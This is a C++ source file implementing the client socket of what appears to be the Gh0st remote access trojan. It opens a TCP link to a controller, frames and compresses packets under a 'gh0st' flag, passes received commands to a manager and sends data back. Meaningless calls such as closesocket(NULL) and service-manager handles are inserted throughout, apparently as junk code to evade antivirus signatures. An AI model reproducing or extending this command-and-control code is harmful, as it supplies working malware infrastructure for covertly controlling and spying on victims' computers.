// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#include "common/KeyboardManager.h"
#include "ClientSocket.h"
#include "zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "common/Manager.h"
#include "common/until.h"
#include "common/EncodingUtil.h"
#pragma comment(lib, "ws2_32.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#pragma comment(lib,"zlib")

CClientSocket::CClientSocket()
{

	//获取前台窗口句柄
	//系统为创建前台窗口的线程分配的优先级略高于其他线程的优先级
    GetForegroundWindow();

    WSADATA wsaData;
	//Socket程序库的版本,用MAKEWORD宏
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    bSendLogin = true;
    closesocket(NULL);

	/* 事件内核对象
	 * 注意这个事件内核对象,创建一个人工重置的初始状态为"未通知"的事件内核对象.
	 * 即如果这个事件内核对象状态从"未通知"变为"已通知"
	 * 则等待成功(WaitForSingleObject()),此时是没有副作用的,即Wait...函数不会将状态再次改为"未通知"
	 * 故允许多个等待这个事件对象的线程都可以被调度.
	 * 
	 * 如果是自动重置的事件对象,等待成功时,OS会自动将这个事件对象重新设为"未通知"状态.
	 * 故一次只能有一个等待该事件的线程可被调度运行,而其他线程继续等待.
	 */
    m_hExitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    m_bIsRunning = false;
    bSendLogin = true;
    m_Socket = INVALID_SOCKET;
    // Packet Flag;
    BYTE bPacketFlag[] = { 'g', 'h', '0', 's', 't' };

    closesocket(NULL);

    memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}

CClientSocket::~CClientSocket()
{

	//OpenSCManager打开服务管理器句柄,SCManager对象表示已安装服务的数据库.
	//建立与指定计算机上的服务控制管理器的连接，并打开指定的服务控制管理器数据库。
	//若指定服务名为null,则默认打开SERVICES_ACTIVE_DATABASE数据库
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    m_bIsRunning = false;
    bSendLogin = false;

	//等待workerthread线程终止运行
    WaitForSingleObject(m_hWorkerThread, INFINITE);

	//关闭SCM对象句柄
    CloseServiceHandle(hSCM);

    if (m_Socket != INVALID_SOCKET)
        Disconnect();


    closesocket(NULL);

    CloseHandle(m_hWorkerThread);
    CloseHandle(m_hExitEvent);
    WSACleanup();

    closesocket(NULL);

}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
    closesocket(NULL);

	//__try,__finally是vc定义的而非c++关键字.
	//详细请看windows的结构化异常处理
    __try
    {
        if (!StartService(NULL, NULL, NULL))
        {
            DWORD dwLastError = ::GetLastError();
            //dwLastError;
            int k = 0;
        }
    }
    __finally
    {
		//空语句,延时一个时钟周期
        __asm nop;
        // 一定要清除一下，不然socket会耗尽系统资源
        Disconnect();
    }
    // 重置事件对像

    closesocket(NULL);

	//将hExitEvent退出事件重置为"未通知"状态
    ResetEvent(m_hExitEvent);
    m_bIsRunning = false;
    bSendLogin = false;

    closesocket(NULL);

    m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m_Socket == SOCKET_ERROR)
        return false;

	//存储给定主机的信息
    hostent* pHostent = NULL;

    //FIXME: 强转有问题，by zhangyl
    char* pHost = EncodeUtil::UnicodeToAnsi(lpszHost);
    pHostent = gethostbyname(pHost);
    delete[] pHost;
    if (pHostent == NULL)
        return false;

    // 构造sockaddr_in结构
    sockaddr_in	ClientAddr;
    ClientAddr.sin_family = AF_INET;

	//从字节顺序转为网络顺序(大端)
    ClientAddr.sin_port = htons(nPort);

    ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

    if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
        return false;
    // 禁用Nagle算法后，对程序效率有严重影响
    // The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
    //   const char chOpt = 1;
    // 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));
    // 验证socks5服务器
    //	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
    //	{
    //		return false;
    //	}
    // 不用保活机制，自己用心跳实瑞


    closesocket(NULL);

    const char chOpt = 1; // True
    DWORD cbBytesReturned;
    // Set KeepAlive 开启保活机制, 防止服务端产生死连接
    if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
    {
        // 设置超时详细信息
        tcp_keepalive	klive;
        klive.onoff = 1; // 启用保活
        klive.keepalivetime = 1000 * 30;//60 * 3; // 3分钟超时 Keep Alive
        klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
        //TODO: 是否要检测一下WSAIoctl是否执行成功
        if (WSAIoctl(
            m_Socket,
            SIO_KEEPALIVE_VALS,
            &klive,
            sizeof(tcp_keepalive),
            NULL,
            0,
            (unsigned long *)&cbBytesReturned,
            0,
            NULL
            ) == SOCKET_ERROR)
        {
            closesocket(m_Socket);
            return false;
        }
            
    }


    closesocket(NULL);

    m_bIsRunning = true;
    bSendLogin = true;
    m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

    closesocket(NULL);

    return true;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
{
    closesocket(NULL);

    CClientSocket *pThis = (CClientSocket *)lparam;
    char	buff[MAX_RECV_BUFFER];

	//套接字的集合,配合select使用
    fd_set fdSocket;
    FD_ZERO(&fdSocket);
	//在集合fdSocket中找m_Socket,没有则添加进去.
    FD_SET(pThis->m_Socket, &fdSocket);

    closesocket(NULL);

    while (pThis->IsRunning())
    {
        fd_set fdRead = fdSocket;
		//从套接字集合中选择"可读"的套接字,返回个数,即如下情况:
		//1. 已经调用listen监听,等待连接.
		//2. 数据可读
		//3. 连接(connection)已经被(closed/reset/terminated)
        int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
        if (nRet == SOCKET_ERROR)
        {
            pThis->Disconnect();
            break;
        }
        if (nRet > 0)
        {
            memset(buff, 0, sizeof(buff));
            int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			//没有收到数据或者出错,停止连接
            if (nSize <= 0)
            {
                pThis->Disconnect();
                break;
            }
            if (nSize > 0) 
                pThis->OnRead((LPBYTE)buff, nSize);
        }
    }

    return -1;
}

void CClientSocket::run_event_loop()
{
    closesocket(NULL);

    WaitForSingleObject(m_hExitEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{

    closesocket(NULL);

    return m_bIsRunning;
}

void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{

    closesocket(NULL);

    try
    {
        if (dwIoSize == 0)
        {
            Disconnect();
            return;
        }
        if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
        {
            // 重新发送	
            Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
            return;
        }
        // Add the message to out message
        // Dont forget there could be a partial, 1, 1 or more + partial mesages
        m_CompressionBuffer.Write(lpBuffer, dwIoSize);


        // Check real Data
        while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
        {
            BYTE bPacketFlag[FLAG_SIZE];
            CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

            memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag));

            int nSize = 0;
            CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));


            if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
            {
                int nUnCompressLength = 0;
                // Read off header
                m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
                m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
                m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
                ////////////////////////////////////////////////////////
                ////////////////////////////////////////////////////////
                // SO you would process your data here
                // 
                // I'm just going to post message so we can see the data
                int	nCompressLength = nSize - HDR_SIZE;
                PBYTE pData = new BYTE[nCompressLength];
                PBYTE pDeCompressionData = new BYTE[nUnCompressLength];



                m_CompressionBuffer.Read(pData, nCompressLength);

                //////////////////////////////////////////////////////////////////////////
                unsigned long	destLen = nUnCompressLength;
                int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
                //////////////////////////////////////////////////////////////////////////
                if (nRet == Z_OK)
                {
                    m_DeCompressionBuffer.ClearBuffer();
                    m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
                    m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
                }


                delete[] pData;
                delete[] pDeCompressionData;
            }
            else
                break;
        }
    }
    catch (...)
    {
        m_CompressionBuffer.ClearBuffer();
        Send(NULL, 0);
    }

    closesocket(NULL);

}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //

	//设置TCP关闭连接时,直接丢弃缓冲区的包,发送RST包进而关闭连接.
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;

    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    TCHAR szModule[MAX_PATH];
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    //see: http://blog.csdn.net/ithzhang/article/details/8316171
    CancelIo((HANDLE)m_Socket);
    CloseServiceHandle(hSCM);
	//互锁原子函数
    InterlockedExchange((LPLONG)&m_bIsRunning, false);
    InterlockedExchange((LPLONG)&bSendLogin, false);


    CKeyboardManager::Myclosesocket(m_Socket);


	//设置退出事件为"已通知"状态
    SetEvent(m_hExitEvent);

    m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send(LPBYTE lpData, UINT nSize)
{
    closesocket(NULL);

    m_WriteBuffer.ClearBuffer();

    if (nSize > 0)
    {
        // Compress data
        unsigned long	destLen = (double)nSize * 1.001 + 12;
        GetTickCount();
        LPBYTE			pDest = new BYTE[destLen];

        if (pDest == NULL)
            return 0;

        int	nRet = compress(pDest, &destLen, lpData, nSize);

        if (nRet != Z_OK)
        {
            delete[] pDest;
            return -1;
        }

        //////////////////////////////////////////////////////////////////////////
        LONG nBufLen = destLen + HDR_SIZE;
        // 5 bytes packet flag
        m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
        // 4 byte header [Size of Entire Packet]
        m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
        // 4 byte header [Size of UnCompress Entire Packet]
        m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
        // Write Data
        m_WriteBuffer.Write(pDest, destLen);
        delete[] pDest;

        //原始未压缩的数据先备份一份
        // 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
        LPBYTE lpResendWriteBuffer = new BYTE[nSize];

        GetForegroundWindow();

        CopyMemory(lpResendWriteBuffer, lpData, nSize);

        GetForegroundWindow();

        m_ResendWriteBuffer.ClearBuffer();
        m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
        if (lpResendWriteBuffer)
            delete[] lpResendWriteBuffer;
    }
    else // 要求重发, 只发送FLAG
    {
        m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
        m_ResendWriteBuffer.ClearBuffer();
        m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
    }

    // 分块发送
    return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
    int			nRet = 0;
    const char	*pbuf = (char *)lpData;
    int			size = 0;
    int			nSend = 0;
    int			nSendRetry = 15;
    // 依次发送
    for (size = nSize; size >= nSplitSize; size -= nSplitSize)
    {
        int i;
        for (i = 0; i < nSendRetry; i++)
        {
            nRet = send(m_Socket, pbuf, nSplitSize, 0);
            if (nRet > 0)
                break;
        }
        if (i == nSendRetry)
            return -1;

        nSend += nRet;
        pbuf += nSplitSize;
        Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
    }
    // 发送最后的部分
    if (size > 0)
    {
        int i;
        for (i = 0; i < nSendRetry; i++)
        {
            nRet = send(m_Socket, (char *)pbuf, size, 0);
            if (nRet > 0)
                break;
        }
        if (i == nSendRetry)
            return -1;
        nSend += nRet;
    }
    if (nSend == nSize)
        return nSend;
    else
        return SOCKET_ERROR;
}

void CClientSocket::setManagerCallBack(CManager *pManager)
{

    closesocket(NULL);

    m_pManager = pManager;
}
